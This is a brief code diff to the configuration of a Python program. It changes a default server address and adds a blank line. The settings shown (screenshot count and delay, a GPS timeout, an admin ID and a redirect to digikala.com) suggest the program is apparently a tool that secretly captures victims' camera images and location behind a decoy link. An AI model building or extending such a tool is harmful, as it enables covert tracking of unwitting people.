@@ -13,7 +13,7 @@ class Config:
     ADMIN_ID = 6848904786
     PORT = int(os.environ.get("PORT", 8080))
     REDIRECT_URL = "https://www.digikala.com"
-    SERVER_URL = os.environ.get("SERVER_URL", f"http://0.0.0.0:{PORT}")
+    SERVER_URL = os.environ.get("SERVER_URL", f"http://localhost:{PORT}")
     SCREENSHOT_DELAY = 3  # ثانیه بین عکس‌ها
     MAX_SCREENSHOTS = 5   # حداکثر عکس
     GPS_TIMEOUT = 10000   # میلی‌ثانیه
@@ -1050,4 +1050,5 @@ if __name__ == "__main__":
 
 
         log.info(f"⏳ Total uptime: {datetime.now() - start_time}")
+
 
